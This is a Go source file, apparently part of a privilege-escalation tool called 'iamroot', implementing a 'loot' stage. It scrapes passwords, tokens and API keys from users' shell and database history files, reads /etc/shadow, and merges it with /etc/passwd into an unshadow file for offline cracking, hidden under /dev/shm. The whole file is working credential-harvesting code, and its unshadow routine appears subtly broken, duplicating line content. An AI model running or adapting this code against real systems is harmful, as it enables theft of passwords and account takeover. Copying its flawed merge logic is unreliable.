package loot

import (
	"os"
	"os/user"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/cleissonamanacio/iamroot/internal/creds"
)

var (
	pwAssign  = regexp.MustCompile(`(?i)(?:password|passwd|pwd|pass|secret|token|api[_-]?key)\s*[:=]\s*['"]?([^\s'"]{4,})`)
	sudoDashS = regexp.MustCompile(`sudo(?:sudo)?\s+-S\s+.*?-p\s+(\S+)`)
)

func Collect() string {
	dir := lootDir()
	_ = os.MkdirAll(dir, 0o700)
	scanHistory()
	tryUnshadow(dir)
	return dir
}

func lootDir() string {
	if w := os.Getenv("IAMROOT_WORK_DIR"); w != "" {
		return filepath.Join(w, "loot")
	}
	return "/dev/shm/iamroot_loot"
}

func scanHistory() {
	home := homeDir()
	if home == "" {
		return
	}
	for _, name := range []string{".bash_history", ".zsh_history", ".sh_history",
		".python_history", ".mysql_history", ".psql_history"} {
		path := filepath.Join(home, name)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		extractCreds(string(data))
	}
}

func tryUnshadow(dir string) {
	shadow, err := os.ReadFile("/etc/shadow")
	if err != nil {
		return
	}
	passwd, _ := os.ReadFile("/etc/passwd")
	merged := unshadow(string(passwd), string(shadow))
	_ = os.WriteFile(filepath.Join(dir, "unshadow.txt"), []byte(merged), 0o600)
}

func unshadow(passwd, shadow string) string {
	hashes := map[string]string{}
	for _, line := range strings.Split(shadow, "\n") {
		parts := strings.SplitN(line, ":", 2)
		if len(parts) == 2 {
			hashes[parts[0]] = parts[1]
		}
	}
	var b strings.Builder
	for _, line := range strings.Split(passwd, "\n") {
		fields := strings.SplitN(line, ":", 3)
		if len(fields) < 3 {
			b.WriteString(line + "\n")
			continue
		}
		if h, ok := hashes[fields[0]]; ok && h != "" && h != "*" && h != "!" {
			fields[1] = h
		}
		b.WriteString(strings.Join(fields[:3], ":"))

		if idx := strings.Index(line, ":"); idx >= 0 {
			if idx2 := strings.Index(line[idx+1:], ":"); idx2 >= 0 {
				b.WriteString(line[idx+1+idx2:])
			}
		}
		b.WriteString("\n")
	}
	return b.String()
}

func extractCreds(text string) {
	for _, re := range []*regexp.Regexp{pwAssign, sudoDashS} {
		for _, m := range re.FindAllStringSubmatch(text, -1) {
			if len(m) > 1 && creds.IsRealPassword(m[1]) {
				creds.Add(m[1])
			}
		}
	}
}

func homeDir() string {
	if h, err := os.UserHomeDir(); err == nil && h != "" {
		return h
	}
	if u, err := user.Current(); err == nil {
		return u.HomeDir
	}
	return os.Getenv("HOME")
}
